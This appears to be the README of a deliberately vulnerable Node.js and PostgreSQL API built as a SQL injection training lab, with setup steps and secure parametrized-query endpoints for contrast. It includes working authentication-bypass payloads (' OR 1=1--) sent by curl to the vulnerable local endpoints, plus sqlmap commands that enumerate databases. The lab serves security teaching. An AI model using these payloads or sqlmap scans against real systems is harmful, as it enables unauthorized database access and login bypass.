## Node.js REST API example with PostgreSQL

#### Purpose: SQLInjection Vulnerability API example 


#### Setup the PostgreSQL DB
```bash
# Setup the PostgreSQL database
curl "http://localhost:3000/setup/postgresql"
```

#### Curl Commands for the Rest API:
```bash
# Get all the users
curl "http://localhost:3000/vulnerable/pg/user"
# Get an specific user (test in this case)
curl "http://localhost:3000/vulnerable/pg/user/test"
# Authenticate by username and password with path parameters
curl "http://localhost:3000/vulnerable/pg/user_auth/test/password"
# Authenticate by username and password with query or get parameters
curl "http://localhost:3000/vulnerable/pg/user_auth?username=test&password=test123"
# USING POST
curl -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test123"}' "http://localhost:3000/vulnerable/pg/user_auth"
# Request body
{
  "username": "test",
  "password": "test123"
}

# -------------------
# SECURE OPERATIONS
# -------------------
# Parametrized queries
curl "http://localhost:3000/secure/pg/user_auth/test/password"
# Parametrized queries
curl "http://localhost:3000/secure/pg/user/test"
# Using Input Validations
curl "http://localhost:3000/secure/pg/user/input/test"
```

---

#### Curl Commands for SQLi:
```bash
# Classic test for SQLi
curl "http://localhost:3000/vulnerable/pg/user/test'%20OR%201=1--"
# SQLi to bypass the password
curl "http://localhost:3000/vulnerable/pg/user_auth/test'%20OR%201=1--/test"
# Sending 2 request parameters and limiting to 1 fetch (LIMIT 1)
curl "http://localhost:3000/vulnerable/pg/user_auth/test'%20OR%201=1%20limit%201--/test"
# With the POST request
curl -X POST -H "Content-Type: application/json" -d "{\"username\":\"' OR 1=1 --\",\"password\":\"test\"}" "http://localhost:3000/vulnerable/pg/user_auth"
```
**IMPORTANT:** %20 represents a URL-encoded space character. (Represents the character in ASCII code)


#### Setup the containers in Docker
```bash
cd <project_folder>
docker-compose up --build -d
# To remove the containers and images related
docker-compose down -v
```

#### Install sqlmap tool 
Penetration testing tool for SQL injection and database servers

```bash
# MacOS with Homebrew installed
brew install sqlmap
```

#### sqlmap example commands:
```bash
sqlmap -u "http://localhost:3000/vulnerable/pg/user_auth?username=1&password=2" -p username,password -dbms=postgresql --dbs --time-sec=1 

# To test the POST 
# --data option is used to provide the POST data in the format of key=value pairs.
sqlmap -u "http://localhost:3000/vulnerable/pg/user_auth" --data "username=test&password=test123" --level=5 --risk=3 -dbms=postgresql
```

